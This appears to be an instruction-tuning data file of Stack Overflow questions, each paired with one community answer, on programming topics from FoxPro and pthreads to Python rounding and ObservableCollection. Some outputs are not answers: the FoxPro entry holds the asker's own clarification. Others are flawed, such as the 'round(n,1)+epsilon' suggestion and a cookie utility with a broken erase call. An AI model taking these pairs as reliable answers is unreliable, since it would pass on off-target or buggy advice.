{"instruction": "I have a foxpro app, that contains hard coded path for icons and bitmaps. That's how foxpro does it and there is no way around it. And this works fine, except that when a removable drive has been used but is not connected, and when is connected windows assigns the same letter as hard coded path, when opening any form that contains such path, the following error message apears (FROM WINDOWS, not fox):\nWindows-No disk\nException Processing Message c0000012 Parameters .....\nAny help please\nNelson Marmol", "output": "It's VFP8 and sorry if I did not explained myself corectly. Also I think \"there's no way around it\" may sounded bad. What I meant is the property \"ICON\" in the forms. Since we have each component type separated in folders (forms,reports, menus, icons, etc), if you try to make the path relative, next time you edit the file, foxpro will include the fullpath. This problem started recently and we found that our clients started using external usb drives as means for backups."}
{"instruction": "Okay, here is the 411 - I have the following event handler in my Global.asax.cs file:\nprivate void Global_PostRequestHandlerExecute(object sender, EventArgs e)\n{\n   if (/* logic that determines that this is an ajax call */)\n   {\n      // we want to set a cookie\n      Response.Cookies.Add(new HttpCookie(\"MyCookie\", \"true\"));\n   }\n}\n\nThat handler will run during Ajax requests (as a result of the Ajax framework I am using), as well as at other times - the condition of the if statement filters out non-Ajax events, and works just fine (it isn't relevant here, so I didn't include it for brevity's sake).\nIt suffices us to say that this works just fine - the cookie is set, I am able to read it on the client, and all is well up to that point.\nNow for the part that drives me nuts.\nHere is the JavaScript function I am using to delete the cookie:\nfunction deleteCookie(name) {\n   var cookieDate = new Date();\n   cookieDate.setTime(cookieDate.getTime() - 1);\n   document.cookie = (name + \"=; expires=\" + cookieDate.toGMTString());\n}\n\nSo, of course, at some point after the cookie is set, I delete it like so:\ndeleteCookie(\"MyCookie\");\n\nOnly, that doesn't do the job; the cookie still exists. So, anyone know why?", "output": "I posted a js cookie util a week or so ago on my blog. This has worked for me on all \"A Grade\" browsers.\nvar CookieUtil = {\n  createCookie:function(name,value,days) {\n    if (days) {\n        var date = new Date();\n        date.setTime(date.getTime()+(days*24*60*60*1000));\n        var expires = \"; expires=\"+date.toGMTString();\n    }\n    else var expires = \"\";\n    document.cookie = name+\"=\"+value+expires+\"; path=/\";\n  },\n  readCookie:function(name) {\n    var nameEQ = name + \"=\";\n    var ca = document.cookie.split(';');\n    for(var i=0;i < ca.length;i++) {\n        var c = ca[i];\n        while (c.charAt(0)==' ') c = c.substring(1,c.length);\n        if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);\n    }\n    return null;\n  },\n  eraseCookie:function(name) {\n    createCookie(name,\"\",-1);\n  }\n};"}
{"instruction": "Here's my first question at SO.\nI have a internal application for my company which I've been recently ask to maintain. The applications is built in PHP and its fairly well coded (OO, DB Abstraction, Smarty) nothing WTF-ish. \nThe problem is the applications is very slow.\nHow do I go about finding out what's slowing the application down? I've optimized the code to make very few DB queries, so I know that it is the PHP code which is taking a while to execute. I need to get some tools which can help me with this and need to devise a strategy for checking my code.\nI can do the checking/strategy work myself, but I need more PHP tools to figure out where my app is crapping up. \nThoughts?", "output": "I use a combination of PEAR Benchmark and log4php. \nAt the top of scripts I want to profile I create an object that wraps around a Benchmark_Timer object. Throughout the code, I add in $object->setMarker(\"name\"); calls, especially around suspect code.\nThe wrapper class has a destroy method that takes the logging information and writes it to log4php. I typically send this to syslog (many servers, aggregates to one log file on one server). \nIn debug, I can watch the log files and see where I need to improve things. Later on in production, I can parse the log files and do performance analysis.\nIt's not xdebug, but it's always on and gives me the ability to compare any two executions of the code."}
{"instruction": "Slashdot has a little widget that allows you to tweak your comment threshold to filter out down-modded comments.  It will be in one place if you scroll to the top of the page, and as you scroll down, at some point, where its original home is about to scroll off the page, it will switch to fixed position, and stay on your screen.  (To see an example, click here.)\nMy question is, how can I accomplish the same effect of having a menu be in one place when scrolled up, and switch to fixed position as the user scrolls down?  I know this will involve a combination of CSS and javascript.  I'm not necessarily looking for a full example of working code, but what steps will my code need to go through?", "output": "Okay, I figured it out.  I will post it here in case it help anyone else.  This solution uses prototype, and an internal library that gives me the registerEvent, getElementX and getElementY functions, which do what you would think.\nvar MenuManager = Class.create({\n    initialize: function initialize(menuElt) {\n    \tthis.menu = $(menuElt);\n    \tthis.homePosn = { x: getElementX(this.menu), y: getElementY(this.menu) };\n    \tregisterEvent(document, 'scroll', this.handleScroll.bind(this));\n    \tthis.handleScroll();\n    },\n    handleScroll: function handleScroll() {\n    \tthis.scrollOffset = document.viewport.getScrollOffsets().top;\n    \tif (this.scrollOffset > this.homePosn.y) {\n    \t\tthis.menu.style.position = 'fixed';\n    \t\tthis.menu.style.top = 0;\n    \t\tthis.menu.style.left = this.homePosn.x;\n    \t} else {\n    \t\tthis.menu.style.position = 'absolute';\n    \t\tthis.menu.style.top = null;\n    \t\tthis.menu.style.left = null;\n    \t}\n    }\n});\n\nJust call the constructor with the id of your menu, and the class will take it from there."}
{"instruction": "Here's my first question at SO.\nI have a internal application for my company which I've been recently ask to maintain. The applications is built in PHP and its fairly well coded (OO, DB Abstraction, Smarty) nothing WTF-ish. \nThe problem is the applications is very slow.\nHow do I go about finding out what's slowing the application down? I've optimized the code to make very few DB queries, so I know that it is the PHP code which is taking a while to execute. I need to get some tools which can help me with this and need to devise a strategy for checking my code.\nI can do the checking/strategy work myself, but I need more PHP tools to figure out where my app is crapping up. \nThoughts?", "output": "As Juan mentioned, xDebug is excellent.  If you're on Windows, WinCacheGrind will let you look over the reports."}
{"instruction": "I have used fork() in C to start another process. How do I start a new thread?", "output": "pthreads is a good start, look here"}
{"instruction": "I have used fork() in C to start another process. How do I start a new thread?", "output": "Check out the pthread (POSIX thread) library."}
{"instruction": "I have used fork() in C to start another process. How do I start a new thread?", "output": "Since you mentioned fork() I assume you're on a Unix-like system, in which case POSIX threads (usually referred to as pthreads) are what you want to use.\nSpecifically, pthread_create() is the function you need to create a new thread. Its arguments are:\nint  pthread_create(pthread_t  *  thread, pthread_attr_t * attr, void *\n   (*start_routine)(void *), void * arg);\n\nThe first argument is the returned pointer to the thread id. The second argument is the thread arguments, which can be NULL unless you want to start the thread with a specific priority. The third argument is the function executed by the thread. The fourth argument is the single argument passed to the thread function when it is executed."}
{"instruction": "I have used fork() in C to start another process. How do I start a new thread?", "output": "AFAIK, ANSI C doesn't define threading, but there are various libraries available.\nIf you are running on Windows, link to msvcrt and use _beginthread or _beginthreadex.\nIf you are running on other platforms, check out the pthreads library (I'm sure there are others as well)."}
{"instruction": "The documentation for the round() function states that you pass it a number, and the positions past the decimal to round. Thus it should do this:\nn = 5.59\nround(n, 1) # 5.6\n\nBut, in actuality, good old floating point weirdness creeps in and you get:\n5.5999999999999996\n\nFor the purposes of UI, I need to display 5.6. I poked around the Internet and found some documentation that this is dependent on my implementation of Python. Unfortunately, this occurs on both my Windows dev machine and each Linux server I've tried. See here also.\nShort of creating my own round library, is there any way around this?", "output": "What about:\nround(n,1)+epsilon"}
{"instruction": "The documentation for the round() function states that you pass it a number, and the positions past the decimal to round. Thus it should do this:\nn = 5.59\nround(n, 1) # 5.6\n\nBut, in actuality, good old floating point weirdness creeps in and you get:\n5.5999999999999996\n\nFor the purposes of UI, I need to display 5.6. I poked around the Internet and found some documentation that this is dependent on my implementation of Python. Unfortunately, this occurs on both my Windows dev machine and each Linux server I've tried. See here also.\nShort of creating my own round library, is there any way around this?", "output": "can't help the way it's stored, but at least formatting works correctly: \n'%.1f' % round(n, 1) # gives you '5.6'"}
{"instruction": "The documentation for the round() function states that you pass it a number, and the positions past the decimal to round. Thus it should do this:\nn = 5.59\nround(n, 1) # 5.6\n\nBut, in actuality, good old floating point weirdness creeps in and you get:\n5.5999999999999996\n\nFor the purposes of UI, I need to display 5.6. I poked around the Internet and found some documentation that this is dependent on my implementation of Python. Unfortunately, this occurs on both my Windows dev machine and each Linux server I've tried. See here also.\nShort of creating my own round library, is there any way around this?", "output": "You can switch the data type to a integer:\n>>> n = 5.59\n>>> int(n * 10) / 10.0\n5.5\n>>> int(n * 10 + 0.5) \n56\n\nAnd then display the number by inserting the locale's decimal separator.\nHowever, Jimmy's answer is better."}
{"instruction": "The documentation for the round() function states that you pass it a number, and the positions past the decimal to round. Thus it should do this:\nn = 5.59\nround(n, 1) # 5.6\n\nBut, in actuality, good old floating point weirdness creeps in and you get:\n5.5999999999999996\n\nFor the purposes of UI, I need to display 5.6. I poked around the Internet and found some documentation that this is dependent on my implementation of Python. Unfortunately, this occurs on both my Windows dev machine and each Linux server I've tried. See here also.\nShort of creating my own round library, is there any way around this?", "output": "You can use the string format operator %, similar to sprintf.\nmystring = \"%.2f\" % 5.5999"}
{"instruction": "The documentation for the round() function states that you pass it a number, and the positions past the decimal to round. Thus it should do this:\nn = 5.59\nround(n, 1) # 5.6\n\nBut, in actuality, good old floating point weirdness creeps in and you get:\n5.5999999999999996\n\nFor the purposes of UI, I need to display 5.6. I poked around the Internet and found some documentation that this is dependent on my implementation of Python. Unfortunately, this occurs on both my Windows dev machine and each Linux server I've tried. See here also.\nShort of creating my own round library, is there any way around this?", "output": "You get '5.6' if you do str(round(n, 1)) instead of just round(n, 1)."}
{"instruction": "The documentation for the round() function states that you pass it a number, and the positions past the decimal to round. Thus it should do this:\nn = 5.59\nround(n, 1) # 5.6\n\nBut, in actuality, good old floating point weirdness creeps in and you get:\n5.5999999999999996\n\nFor the purposes of UI, I need to display 5.6. I poked around the Internet and found some documentation that this is dependent on my implementation of Python. Unfortunately, this occurs on both my Windows dev machine and each Linux server I've tried. See here also.\nShort of creating my own round library, is there any way around this?", "output": "Floating point math is vulnerable to slight, but annoying, precision inaccuracies.  If you can work with integer or fixed point, you will be guaranteed precision."}
{"instruction": "The documentation for the round() function states that you pass it a number, and the positions past the decimal to round. Thus it should do this:\nn = 5.59\nround(n, 1) # 5.6\n\nBut, in actuality, good old floating point weirdness creeps in and you get:\n5.5999999999999996\n\nFor the purposes of UI, I need to display 5.6. I poked around the Internet and found some documentation that this is dependent on my implementation of Python. Unfortunately, this occurs on both my Windows dev machine and each Linux server I've tried. See here also.\nShort of creating my own round library, is there any way around this?", "output": "printf the sucker.\nprint '%.1f' % 5.59  # returns 5.6"}
{"instruction": "The documentation for the round() function states that you pass it a number, and the positions past the decimal to round. Thus it should do this:\nn = 5.59\nround(n, 1) # 5.6\n\nBut, in actuality, good old floating point weirdness creeps in and you get:\n5.5999999999999996\n\nFor the purposes of UI, I need to display 5.6. I poked around the Internet and found some documentation that this is dependent on my implementation of Python. Unfortunately, this occurs on both my Windows dev machine and each Linux server I've tried. See here also.\nShort of creating my own round library, is there any way around this?", "output": "Formatting works correctly even without having to round:\n\"%.1f\" % n"}
{"instruction": "I have heard that the Liskov Substitution  Principle (LSP) is a fundamental principle of object oriented design. What is it and what are some examples of its use?", "output": "Would implementing ThreeDBoard in terms of an array of Board be that useful?\nPerhaps you may want to treat slices of ThreeDBoard in various planes as a Board. In that case you may want to abstract out an interface (or abstract class) for Board to allow for multiple implementations.\nIn terms of external interface, you might want to factor out a Board interface for both TwoDBoard and ThreeDBoard (although none of the above methods fit)."}
{"instruction": "I have heard that the Liskov Substitution  Principle (LSP) is a fundamental principle of object oriented design. What is it and what are some examples of its use?", "output": "The Liskov Substitution Principle (LSP, lsp) is a concept in Object Oriented Programming that states:\n\nFunctions that use pointers or\n  references to base classes must be\n  able to use objects of derived classes\n  without knowing it.\n\nAt its heart LSP is about interfaces and contracts as well as how to decide when to extend a class vs. use another strategy such as composition to achieve your goal.\nThe most effective way I have seen to illustrate this point was in Head First OOA&D. They present a scenario where you are a developer on a project to build a framework for strategy games.\nThey present a class that represents a board that looks like this:\n\nAll of the methods take X and Y coordinates as parameters to locate the tile position in the two-dimensional array of Tiles. This will allow a game developer to manage units in the board during the course of the game.\nThe book goes on to change the requirements to say that the game frame work must also support 3D game boards to accommodate games that have flight. So a ThreeDBoard class is introduced that extends Board.\nAt first glance this seems like a good decision. Board provides both the Height and Width properties and ThreeDBoard provides the Z axis.\nWhere it breaks down is when you look at all the other members inherited from Board. The methods for AddUnit, GetTile, GetUnits and so on, all take both X and Y parameters in the Board class but the ThreeDBoard needs a Z parameter as well.\nSo you must implement those methods again with a Z parameter. The Z parameter has no context to the Board class and the inherited methods from the Board class lose their meaning. A unit of code attempting to use the ThreeDBoard class as its base class Board would be very out of luck.\nMaybe we should find another approach. Instead of extending Board, ThreeDBoard should be composed of Board objects. One Board object per unit of the Z axis.\nThis allows us to use good object oriented principles like encapsulation and reuse and doesn\u2019t violate LSP."}
{"instruction": "I have been writing Flex applications for a few months now and luckily have not needed a full debugger as of yet, so far I have just used a few Alert boxes...\nIs there an available debugger that is included in the free Flex SDK? I am not using FlexBuilder (I have been using Emacs and compiling with ant).\nIf not, how do you debug Flex applications without FlexBuilder? (note: I have no intentions of using flexbuilder)", "output": "I had the same problem when programming with ActionScript and having to test it on a browser. Try this. It involves using Firefox (which I believe you do) and FireBug to receive the debug messages."}
{"instruction": "I have been writing Flex applications for a few months now and luckily have not needed a full debugger as of yet, so far I have just used a few Alert boxes...\nIs there an available debugger that is included in the free Flex SDK? I am not using FlexBuilder (I have been using Emacs and compiling with ant).\nIf not, how do you debug Flex applications without FlexBuilder? (note: I have no intentions of using flexbuilder)", "output": "A debugger called fdb is included in the Flex SDK. Here's some documentation on how to use it:\n\nAdobe DevCenter: Debugging Client-Side Code in Flex Applications\nFlex 3 Help: Using the Command-Line Debugger"}
{"instruction": "I'm creating an ASP.NET web site where all pages hang off a database-driven tree-hierarchy.  Pages typically present HTML content.  But, some will execute programming.\nExamples: (1) a \"contact us\" form or (2) a report generator\nHow should I represent/reference the programming within the database?  Should I have a varchar value of a Web User Control (.ascx) name?  Or a Web Form (.aspx) name?  Something else?  Or should it just be an integer or other such ID in a dictionary within my application?\nCan I make an ASP.NET Site Map Provider with this structure?\nSee more information here: Which is the best database schema for my navigation?", "output": "Our development team has had success with defining the name of a Web User Control in the database. Upon page load it checks too see what controls to dynamically load from the database. \nWe use Web User Controls instead of Web Forms in order to ensure we can use the control on any page.\nYou can also dynamically build a site map using ASP.Net's provider. CodeProject has a good example."}
{"instruction": "We all know T-SQL's string manipulation capabilities sometimes leaves much to be desired...\nI have a numeric field that needs to be output in T-SQL as a right-aligned text column. Example:\nValue\n----------\n   143.55\n  3532.13\n     1.75\n\nHow would you go about that? A good solution ought to be clear and compact, but remember there is such a thing as \"too clever\".\nI agree this is the wrong place to do this, but sometimes we're stuck by forces outside our control.\nThank you.", "output": "The STR function has an optional length argument as well as a number-of-decimals one.\nSELECT STR(123.45, 6, 1)\n\n------\n 123.5\n\n(1 row(s) affected)"}
{"instruction": "We all know T-SQL's string manipulation capabilities sometimes leaves much to be desired...\nI have a numeric field that needs to be output in T-SQL as a right-aligned text column. Example:\nValue\n----------\n   143.55\n  3532.13\n     1.75\n\nHow would you go about that? A good solution ought to be clear and compact, but remember there is such a thing as \"too clever\".\nI agree this is the wrong place to do this, but sometimes we're stuck by forces outside our control.\nThank you.", "output": "If you MUST do this in SQL you can use the folowing code (This code assumes that you have no numerics that are bigger than 40 chars):\nSELECT REPLICATE(' ', 40 - LEN(CAST(numColumn as varchar(40)))) + \nCAST(numColumn AS varchar(40)) FROM YourTable"}
{"instruction": "We all know T-SQL's string manipulation capabilities sometimes leaves much to be desired...\nI have a numeric field that needs to be output in T-SQL as a right-aligned text column. Example:\nValue\n----------\n   143.55\n  3532.13\n     1.75\n\nHow would you go about that? A good solution ought to be clear and compact, but remember there is such a thing as \"too clever\".\nI agree this is the wrong place to do this, but sometimes we're stuck by forces outside our control.\nThank you.", "output": "The easiest way is to pad left:\nCREATE FUNCTION PadLeft(@PadString nvarchar(100), @PadLength int)\nRETURNS nvarchar(200)\nAS\nbegin\nreturn  replicate(' ',@padlength-len(@PadString)) + @PadString\nend\ngo\nprint dbo.PadLeft('123.456', 20)\nprint dbo.PadLeft('1.23', 20)"}
{"instruction": "I have used fork() in C to start another process. How do I start a new thread?", "output": "Threads are not part of the C standard, so the only way to use threads is to use some library (eg: POSIX threads in Unix/Linux, _beginthread/_beginthreadex if you want to use the C-runtime from that thread or just CreateThread Win32 API)"}
{"instruction": "Many applications have grids that display data from a database table one page at a time. Many of them also let the user pick the number of records per page, sort by any column, and navigate back and forth through the results.\nWhat's a good algorithm to implement this pattern without bringing the entire table to the client and then filtering the data on the client. How do you bring just the records you want to display to the user?\nDoes LINQ simplify the solution?", "output": "There is a discussion about this Here\nThe technique gets page number 100,000 from a 150,000 line database in 78ms\n\nUsing optimizer knowledge and SET ROWCOUNT, the first EmployeeID in the page that is requested is stored in a local variable for a starting point. Next, SET ROWCOUNT to the maximum number of records that is requested in @maximumRows. This allows paging the result set in a much more efficient manner. Using this method also takes advantage of pre-existing indexes on the table as it goes directly to the base table and not to a locally created table. \n\nI am afraid I am not able to judge if it is better than the current accepted answer."}
{"instruction": "I have heard that the Liskov Substitution  Principle (LSP) is a fundamental principle of object oriented design. What is it and what are some examples of its use?", "output": "Functions that use pointers or references to base classes must be able to use objects of derived classes without knowing it.\n\nWhen I first read about LSP, I assumed that this was meant in a very strict sense, essentially equating it to interface implementation and type-safe casting.  Which would mean that LSP is either ensured or not by the language itself.  For example, in this strict sense, ThreeDBoard is certainly substitutable for Board, as far as the compiler is concerned.\nAfter reading up more on the concept though I found that LSP is generally interpreted more broadly than that.\nIn short, what it means for client code to \"know\" that the object behind the pointer is of a derived type rather than the pointer type is not restricted to type-safety.  Adherence to LSP is also testable through probing the objects actual behavior.  That is, examining the impact of an object's state and method arguments on the results of the method calls, or the types of exceptions thrown from the object.\nGoing back to the example again, in theory the Board methods can be made to work just fine on ThreeDBoard.  In practice however, it will be very difficult to prevent differences in behavior that client may not handle properly, without hobbling the functionality that ThreeDBoard is intended to add.\nWith this knowledge in hand, evaluating LSP adherence can be a great tool in determining when composition is the more appropriate mechanism for extending existing functionality, rather than inheritance."}
{"instruction": "Okay, here is the 411 - I have the following event handler in my Global.asax.cs file:\nprivate void Global_PostRequestHandlerExecute(object sender, EventArgs e)\n{\n   if (/* logic that determines that this is an ajax call */)\n   {\n      // we want to set a cookie\n      Response.Cookies.Add(new HttpCookie(\"MyCookie\", \"true\"));\n   }\n}\n\nThat handler will run during Ajax requests (as a result of the Ajax framework I am using), as well as at other times - the condition of the if statement filters out non-Ajax events, and works just fine (it isn't relevant here, so I didn't include it for brevity's sake).\nIt suffices us to say that this works just fine - the cookie is set, I am able to read it on the client, and all is well up to that point.\nNow for the part that drives me nuts.\nHere is the JavaScript function I am using to delete the cookie:\nfunction deleteCookie(name) {\n   var cookieDate = new Date();\n   cookieDate.setTime(cookieDate.getTime() - 1);\n   document.cookie = (name + \"=; expires=\" + cookieDate.toGMTString());\n}\n\nSo, of course, at some point after the cookie is set, I delete it like so:\ndeleteCookie(\"MyCookie\");\n\nOnly, that doesn't do the job; the cookie still exists. So, anyone know why?", "output": "Have you checked the client-side and server-side cookie domains and paths to ensure they're the same?\nIs one cookie secure and the other not?\nOther than that, I would suspect server/client clock sync issues, as Erlend suggests."}
{"instruction": "Please, now that I've re-written the question, and before it suffers from further fast-gun answers or premature closure by eager editors let me point out that this is not a duplicate of this question.  I know how to remove duplicates from an array.\nThis question is about removing sequences from an array, not duplicates in the strict sense.\nConsider this sequence of elements in an array;\n[0] a\n[1] a\n[2] b\n[3] c\n[4] c\n[5] a\n[6] c\n[7] d\n[8] c\n[9] d\n\nIn this example I want to obtain the following...\n[0] a\n[1] b\n[2] c\n[3] a\n[4] c\n[5] d\n\nNotice that duplicate elements are retained but that sequences of the same element have been reduced to a single instance of that element.\nFurther, notice that when two lines repeat they should be reduced to one set (of two lines).\n[0] c\n[1] d\n[2] c\n[3] d\n\n...reduces to...\n[0] c\n[1] d\n\nI'm coding in C# but algorithms in any language appreciated.", "output": "I would dump them all into your favorite Set implementation.\nEDIT:  Now that I understand the question, your original solution looks like the best way to do this.  Just loop through the array once, keeping an array of flags to mark which elements to keep, plus a counter to keep track to the size of the new array.  Then loop through again to copy all the keepers to a new array."}
{"instruction": "Please, now that I've re-written the question, and before it suffers from further fast-gun answers or premature closure by eager editors let me point out that this is not a duplicate of this question.  I know how to remove duplicates from an array.\nThis question is about removing sequences from an array, not duplicates in the strict sense.\nConsider this sequence of elements in an array;\n[0] a\n[1] a\n[2] b\n[3] c\n[4] c\n[5] a\n[6] c\n[7] d\n[8] c\n[9] d\n\nIn this example I want to obtain the following...\n[0] a\n[1] b\n[2] c\n[3] a\n[4] c\n[5] d\n\nNotice that duplicate elements are retained but that sequences of the same element have been reduced to a single instance of that element.\nFurther, notice that when two lines repeat they should be reduced to one set (of two lines).\n[0] c\n[1] d\n[2] c\n[3] d\n\n...reduces to...\n[0] c\n[1] d\n\nI'm coding in C# but algorithms in any language appreciated.", "output": "I agree that if you can just dump the strings into a Set, then that might be the easiest solution. \nIf you don't have access to a Set implementation for some reason, I would just sort the strings alphabetically and then go through once and remove the duplicates. How to sort them and remove duplicates from the list will depend on what language and environment you are running your code. \nEDIT: Oh, ick....  I see based on your clarification that you expect that patterns might occur even over separate lines. My approach won't solve your problem. Sorry. Here is a question for you. If I had the following file.\na\na\nb\nc\nc\na\na\nb\nc\nc\nWould you expect it to simplify to \na\nb\nc"}
{"instruction": "Was considering the System.Collections.ObjectModel ObservableCollection<T> class. This one is strange because  \n\nit has an Add Method which takes one item only. No AddRange or equivalent. \nthe Notification event arguments has a NewItems property, which is a IList (of objects.. not T)\n\nMy need here is to add a batch of objects to a collection and the listener also gets the batch as part of the notification. Am I missing something with ObservableCollection ? Is there another class that meets my spec?\nUpdate: Don't want to roll my own as far as feasible. I'd have to build in add/remove/change etc.. a whole lot of stuff.\n\nRelated Q:\nhttp://stackoverflow.com/questions/670577/observablecollection-doesnt-support-addrange-method-so-i-get-notified-for-each", "output": "Inherit from List<T> and override the Add() and AddRange() methods to raise an event?"}
{"instruction": "Was considering the System.Collections.ObjectModel ObservableCollection<T> class. This one is strange because  \n\nit has an Add Method which takes one item only. No AddRange or equivalent. \nthe Notification event arguments has a NewItems property, which is a IList (of objects.. not T)\n\nMy need here is to add a batch of objects to a collection and the listener also gets the batch as part of the notification. Am I missing something with ObservableCollection ? Is there another class that meets my spec?\nUpdate: Don't want to roll my own as far as feasible. I'd have to build in add/remove/change etc.. a whole lot of stuff.\n\nRelated Q:\nhttp://stackoverflow.com/questions/670577/observablecollection-doesnt-support-addrange-method-so-i-get-notified-for-each", "output": "If you're wanting to inherit from a collection of some sort, you're probably better off inheriting from System.Collections.ObjectModel.Collection because it provides virtual methods for override. You'll have to shadow methods off of List if you go that route.\nI'm not aware of any built-in collections that provide this functionality, though I'd welcome being corrected :)"}
{"instruction": "I'm stuck on a fix to a legacy Visual C++ 6 app. In the C++ DLL source I have put\nextern \"C\" _declspec(dllexport) char* MyNewVariable = 0;\n\nwhich results in MyNewVariable showing up (nicely undecorated) in the export table (as shown by dumpbin /exports blah.dll). However, I can't figure out how to declare the variable so that I can access it in a C source file. I have tried various things, including\n_declspec(dllimport) char* MyNewVariable;\n\nbut that just gives me a linker error:\nunresolved external symbol \"__declspec(dllimport) char * MyNewVariable\" (__imp_?MyNewVariable@@3PADA)\nextern \"C\" _declspec(dllimport) char* MyNewVariable;\n\nas suggested by Tony (and as I tried before) results in a different expected decoration, but still hasn't removed it:\nunresolved external symbol __imp__MyNewVariable\nHow do I write the declaration so that the C++ DLL variable is accessible from the C app?\n\nThe Answer\nAs identified by botismarius and others (many thanks to all), I needed to link with the DLL's .lib. To prevent the name being mangled I needed to declare it (in the C source) with no decorators, which means I needed to use the .lib file.", "output": "In the dll source code you should have this implementation so that the .lib file exports the symbol:\nextern \"C\" _declspec(dllexport) char* MyNewVariable = 0;\n\nThe c client should use a header with this declaration so that the client code will import the symbol:\nextern \"C\" _declspec(dllimport) char* MyNewVariable;\n\nThis header will cause a compile error if #include-ed in the dll source code, so it is usually put in an export header that is used only for exported functions and only by clients.\nIf you need to, you can also create a \"universal\" header that can be included anywhere that looks like this:\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n#ifdef dll_source_file\n#define EXPORTED declspec(dllexport) \n#else\n#define EXPORTED declspec(dllimport) \n#endif dll_source_file\n#ifdef __cplusplus\n}\n#endif\n\nEXPORTED char* MyNewVariable;\n\nThen the dll source code looks like this:\n#define dll_source_code \n#include \"universal_header.h\"\n\nEXPORTED char* MyNewVariable = 0;\n\nAnd the client looks like this:\n#include \"universal_header.h\"\n...\nMyNewVariable = \"Hello, world\";\n\nIf you do this a lot, the monster #ifdef at the top can go in export_magic.h and universal_header.h becomes:\n#include \"export_magic.h\"\n\nEXPORTED char *MyNewVariable;"}
{"instruction": "Was considering the System.Collections.ObjectModel ObservableCollection<T> class. This one is strange because  \n\nit has an Add Method which takes one item only. No AddRange or equivalent. \nthe Notification event arguments has a NewItems property, which is a IList (of objects.. not T)\n\nMy need here is to add a batch of objects to a collection and the listener also gets the batch as part of the notification. Am I missing something with ObservableCollection ? Is there another class that meets my spec?\nUpdate: Don't want to roll my own as far as feasible. I'd have to build in add/remove/change etc.. a whole lot of stuff.\n\nRelated Q:\nhttp://stackoverflow.com/questions/670577/observablecollection-doesnt-support-addrange-method-so-i-get-notified-for-each", "output": "It seems that the INotifyCollectionChanged interface allows for updating when multiple items were added, so I'm not sure why ObservableCollection<T> doesn't have an AddRange.  You could make an extension method for AddRange, but that would cause an event for every item that is added.  If that isn't acceptable you should be able to inherit from ObservableCollection<T> as follows:\npublic class MyObservableCollection<T> : ObservableCollection<T>\n{\n    // matching constructors ...\n\n    bool isInAddRange = false;\n\n    protected override void OnCollectionChanged(NotifyCollectionChangedEventArgs e)\n    {\n        // intercept this when it gets called inside the AddRange method.\n        if (!isInAddRange) \n            base.OnCollectionChanged(e);\n    }\n\n\n    public void AddRange(IEnumerable<T> items)\n    {\n         isInAddRange = true;\n         foreach (T item in items)\n            Add(item);\n         isInAddRange = false;\n\n         var e = new NotifyCollectionChangedEventArgs(\n             NotifyCollectionChangedAction.Add,\n             items.ToList());\n         base.OnCollectionChanged(e);\n    }\n}"}
{"instruction": "Was considering the System.Collections.ObjectModel ObservableCollection<T> class. This one is strange because  \n\nit has an Add Method which takes one item only. No AddRange or equivalent. \nthe Notification event arguments has a NewItems property, which is a IList (of objects.. not T)\n\nMy need here is to add a batch of objects to a collection and the listener also gets the batch as part of the notification. Am I missing something with ObservableCollection ? Is there another class that meets my spec?\nUpdate: Don't want to roll my own as far as feasible. I'd have to build in add/remove/change etc.. a whole lot of stuff.\n\nRelated Q:\nhttp://stackoverflow.com/questions/670577/observablecollection-doesnt-support-addrange-method-so-i-get-notified-for-each", "output": "Extension Method Man to the rescue!\n    /// <summary>\n\t/// Adds all given items to the collection\n\t/// </summary>\n\t/// <param name=\"collection\">The collection.</param>\n\t/// <param name=\"toAdd\">Objects to add.</param>\n\tpublic static void AddAll<T>(this IList<T> collection, params T[] toAdd)\n\t{\n\t\tforeach (var o in toAdd)\n\t\t\tcollection.Add(o);\n\t}"}
{"instruction": "Say instead of returning void a method you returned a reference to the class even if it didn't make any particular semantic sense.  It seems to me like it would give you more options on how the methods are called, allowing you to use it in a fluent-interface-like style and I can't really think of any disadvantages since you don't have to do anything with the return value (even store it).\nSo suppose you're in a situation where you want to update an object and then return its current value.\ninstead of saying \nmyObj.Update();\nvar val = myObj.GetCurrentValue();\n\nyou will be able to combine the two lines to say\nvar val = myObj.Update().GetCurrentValue();\n\n\nEDIT:  I asked the below on a whim, in retrospect, I agree that its likely to be unnecessary and complicating, however my question regarding returning this rather than void stands.\nOn a related note, what do you guys think of having the language include a new bit of syntactic sugar:\nvar val = myObj.Update()<.GetCurrentValue();\n\nThis operator would have a low order of precedence so myObj.Update() would execute first and then call  GetCurrentValue() on myObj instead of the void return of Update.\nEssentially I'm imagining an operator that will say \"call the method on the right-hand side of the operator on the first valid object on the left\".  Any thoughts?", "output": "Returning \"self\" or \"this\" is a common pattern, sometimes referred to as \"method chaining\".  As for your proposed syntax sugar, I'm not so sure.  I'm not a .NET guy, but it doesn't seem terribly useful to me."}
{"instruction": "Say instead of returning void a method you returned a reference to the class even if it didn't make any particular semantic sense.  It seems to me like it would give you more options on how the methods are called, allowing you to use it in a fluent-interface-like style and I can't really think of any disadvantages since you don't have to do anything with the return value (even store it).\nSo suppose you're in a situation where you want to update an object and then return its current value.\ninstead of saying \nmyObj.Update();\nvar val = myObj.GetCurrentValue();\n\nyou will be able to combine the two lines to say\nvar val = myObj.Update().GetCurrentValue();\n\n\nEDIT:  I asked the below on a whim, in retrospect, I agree that its likely to be unnecessary and complicating, however my question regarding returning this rather than void stands.\nOn a related note, what do you guys think of having the language include a new bit of syntactic sugar:\nvar val = myObj.Update()<.GetCurrentValue();\n\nThis operator would have a low order of precedence so myObj.Update() would execute first and then call  GetCurrentValue() on myObj instead of the void return of Update.\nEssentially I'm imagining an operator that will say \"call the method on the right-hand side of the operator on the first valid object on the left\".  Any thoughts?", "output": "The NeXTSTEP Objective-C framework used to use this pattern. It was discontinued in that framework once distributed objects (remote procedure calls, basically) were added to the language\u2014a function that returned self had to be a synchronous invocation, since the distributed object system saw the return type and assumed that the caller would need to know the result of the function."}
